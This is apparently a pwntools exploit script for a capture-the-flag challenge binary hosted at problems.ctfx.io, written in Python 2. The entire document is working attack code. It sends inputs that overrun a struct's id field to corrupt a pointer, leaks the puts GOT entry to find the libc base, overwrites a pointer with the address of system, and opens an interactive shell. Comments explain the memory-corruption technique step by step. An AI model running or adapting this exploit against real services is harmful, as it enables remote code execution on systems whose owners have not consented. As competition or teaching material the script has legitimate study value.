from pwn import *
context(arch='i386', os='linux') # <-- Add the architecture and os

binary = ELF("dat_boinary")
libc = ELF("libc.so.6")

HOST,PORT = "problems.ctfx.io",1337
r=remote(HOST,PORT)
r.sendline("12345678")  # Overwrites the last null byte in the id
r.sendline("5")         # Set dankness to 0x69696969
r.sendline("1")         # Reset the meme_id
"""
At this point, the struct looks something like this:
meme_post
{
    char id[8]      : "12345678"
    int dankness    : 0x69696969
    char* content   : [something 4 bytes]
}


Because there are no null bytes in this struct, calling strlen(id) is going to
return a large enough size to overwrite the pointer
"""
r.sendline("12345678" + p32(0x08049118)*2 + "\n"*5)
r.sendline("4")
time.sleep(0.1)
print r.recvuntil(":\t")
a=(r.recvline())

# Leak the GOT pointer for puts
libc_base = int( a[0:4][::-1].encode("hex"),16) - libc.symbols['puts']

print hex(libc_base)
system = libc_base + libc.symbols["system"]
print a
r.sendline("2")
print r.recv(4000)
r.sendline("5")
r.recv(4000)
r.sendline("3")
#overwrite with system
r.sendline(p32(system) )
r.sendline("5")
r.interactive()
r.recv(4000)
